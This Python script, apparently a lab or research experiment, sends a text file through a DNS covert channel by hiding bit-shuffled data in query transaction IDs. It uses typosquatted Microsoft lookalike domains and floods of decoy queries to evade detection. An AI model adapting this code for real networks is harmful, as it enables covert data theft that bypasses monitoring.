import socket
import random
import time
import sys
from IO_ops import *
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE


SPECIAL_CHAR = 0x0000
DOMAINS = [
    'teams.rnicrosoft.pl',
    'outlook.rnicrosoft.pl',
    'onedrive.rnicrosoft.pl',
    'login.rnicrosoft.pl',
    'portal.rnicrosoft.pl',
    'sharepoint.rnicrosoft.pl',
    'skype.rnicrosoft.pl',
    'yammer.rnicrosoft.pl',
    'admin.rnicrosoft.pl',
    'support.rnicrosoft.pl',
    'docs.rnicrosoft.pl',
    'store.rnicrosoft.pl',
    'calendar.rnicrosoft.pl',
    'azure.rnicrosoft.pl',
    'compliance.rnicrosoft.pl',
    'security.rnicrosoft.pl'
]


def mix_two_chars_bits(chunk):
    bits1 = chunk[0:8]
    bits2 = chunk[8:]
    mixed = bits1[:4] + bits2[:4] + bits1[4:6] + bits2[4:6] + bits1[6:8] + bits2[6:8]
    return mixed

def dns_query(txid, domain):
    return DNSRecord(
        DNSHeader(id=int(txid)),
        q=DNSQuestion(str(domain), QTYPE.A)
    )

def split_string_data(text):
    n = random.randint(2, 10)   # losowa liczba części
    length = len(text)
    # podstawowa wielkość części i liczba "dodatkowych" elementów do rozdzielenia
    k, r = divmod(length, n)

    parts = []
    start = 0
    for i in range(n):
        end = start + k + (1 if i < r else 0)
        parts.append(text[start:end])
        start = end

    return parts

def random_ascii_binary() -> str:
    """
    Losuje punkt kodowy ASCII od U+0001 do U+007F (bez U+0000),
    koduje go do UTF-8 (1 bajt) i zwraca ciąg 8 bitów.
    """
    cp = random.randint(1, 0x7F)        # 1…127
    byte = chr(cp).encode('utf-8')      # zawsze 1 bajt
    return f'{byte[0]:08b}'             # np. '01000001'

def send_dns_query(filepath):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(2)
 
    text_full = read_file(filepath)
    if text_full is None:
        print(f"Error with reading data from a file {filepath}")
        return
    text_parts = split_text_to_chunks(text_full)

    #######################
    #### 3 fake plikow ####
    #######################
    print("Spanko przed wyslaniem fake danych")
    for i in range(0, 150000):
        byte1 = random_ascii_binary()
        byte2 = random_ascii_binary()
        chunk = byte1 + byte2
        
        chunk = mix_two_chars_bits(chunk)
        txid = int(chunk, 2) # Konwersja bitów na int

        domain = random.choice(DOMAINS)
        
        client.sendto(dns_query(txid, domain).pack(), ('127.0.0.1', 5353))
        print(f"Sent fake TXID: {txid} (chunk: {chunk})")

        # Odbierz odpowiedz TTL i czekaj az minie TTL
        # TODO: odkomentowac, zeby wysylac kolejen dane po wygasneiciu rekordu
        try:
            response, _ = client.recvfrom(512)
            dns_response = DNSRecord.parse(response)
            ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
            print(f"Received response, sleeping for {ttl} seconds")
            # time.sleep(ttl)
        except socket.timeout:
            print("No response received (timeout), sleeping for 1 second")
                # time.sleep(1)

    time.sleep(120)
    print("Spanko przed wyslaniem ukrytych danych")

    for text_part in text_parts:
        # Podzial czesci tesktu na jeszcze mneijsze fragmenty i przygotowanie fakeowych danych do przeslania
        text_parts_parts = split_string_data(text_part)
        fake_data_number = [random.randint(len(part) * 2, len(part) * 4) for part in text_parts_parts]

        # Fast debug info
        # print(len(text_parts), len(text_part))
        # print(len(text_parts_parts))
        # print(fake_data_number)
        # time.sleep(15)
        
        for idx, text_parts_part in enumerate(text_parts_parts): 
            #######################
            ###### Fake dane ######
            #######################

            for i in range(0, fake_data_number[idx]):
                byte1 = random_ascii_binary()
                byte2 = random_ascii_binary()
                chunk = byte1 + byte2
                
                chunk = mix_two_chars_bits(chunk)
                txid = int(chunk, 2) # Konwersja bitów na int

                domain = random.choice(DOMAINS)
                
                client.sendto(dns_query(txid, domain).pack(), ('127.0.0.1', 5353))
                print(f"Sent fake TXID: {txid} (chunk: {chunk})")

                # Odbierz odpowiedz TTL i czekaj az minie TTL
                # TODO: odkomentowac, zeby wysylac kolejen dane po wygasneiciu rekordu
                try:
                    response, _ = client.recvfrom(512)
                    dns_response = DNSRecord.parse(response)
                    ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
                    print(f"Received response, sleeping for {ttl} seconds")
                    # time.sleep(ttl)
                except socket.timeout:
                    print("No response received (timeout), sleeping for 1 second")
                    # time.sleep(1)

            #######################
            #### Start danych #####
            #######################
            binary_list = text_to_binary_list(text_parts_part)
            binary_data = ''.join(binary for _, binary in binary_list)

            domain = random.choice(DOMAINS)
            client.sendto(dns_query(SPECIAL_CHAR, domain).pack(), ('127.0.0.1', 5353))
            print(f"Sent START TXID: {SPECIAL_CHAR}")

            try:
                response, _ = client.recvfrom(512)
                print("Response received")
            except socket.timeout:
                print("No response received (timeout)")

            #######################
            ##### Ukryte dane #####
            #######################
            for i in range(0, len(binary_data), 16):
                domain = random.choice(DOMAINS)
                chunk = binary_data[i:i+16]
                if len(chunk) < 16:
                    chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
                
                chunk = mix_two_chars_bits(chunk)
                txid = int(chunk, 2) # Konwersja bitów na int

                
                client.sendto(dns_query(txid, domain).pack(), ('127.0.0.1', 5353))
                print(f"Sent TXID: {txid} (chunk: {chunk})")

                # Odbierz odpowiedz TTL i czekaj az minie TTL
                # TODO: odkomentowac, zeby wysylac kolejen dane po wygasneiciu rekordu
                try:
                    response, _ = client.recvfrom(512)
                    dns_response = DNSRecord.parse(response)
                    ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
                    print(f"Received response, sleeping for {ttl} seconds")
                    # time.sleep(ttl)
                except socket.timeout:
                    print("No response received (timeout), sleeping for 1 second")
                    # time.sleep(1)

            #######################
            #### Koniec danych ####
            #######################
            client.sendto(dns_query(SPECIAL_CHAR, domain).pack(), ('127.0.0.1', 5353))
            print(f"Sent END TXID: {SPECIAL_CHAR}")

            try:
                response, _ = client.recvfrom(512)
                print("Response received")
            except socket.timeout:
                print("No response received (timeout)")

    #######################
    #### 4 fake plikow ####
    #######################
    print("Spanko przed wyslaniem fake danych")
    time.sleep(120)
    for i in range(0, 200000):
        byte1 = random_ascii_binary()
        byte2 = random_ascii_binary()
        chunk = byte1 + byte2
        
        chunk = mix_two_chars_bits(chunk)
        txid = int(chunk, 2) # Konwersja bitów na int

        domain = random.choice(DOMAINS)
        
        client.sendto(dns_query(txid, domain).pack(), ('127.0.0.1', 5353))
        print(f"Sent fake TXID: {txid} (chunk: {chunk})")

        # Odbierz odpowiedz TTL i czekaj az minie TTL
        # TODO: odkomentowac, zeby wysylac kolejen dane po wygasneiciu rekordu
        try:
            response, _ = client.recvfrom(512)
        except socket.timeout:
            print("No response received (timeout), sleeping for 1 second")
                # time.sleep(1)


if __name__ == "__main__":
    try:
        filepath = "data/Sofokles-Antygona.txt"
        send_dns_query(filepath)
    except KeyboardInterrupt:
        print("User stopped the program (CTRL+C).")
        sys.exit(0)
    except Exception as Err:
        print("Server error: ", Err)
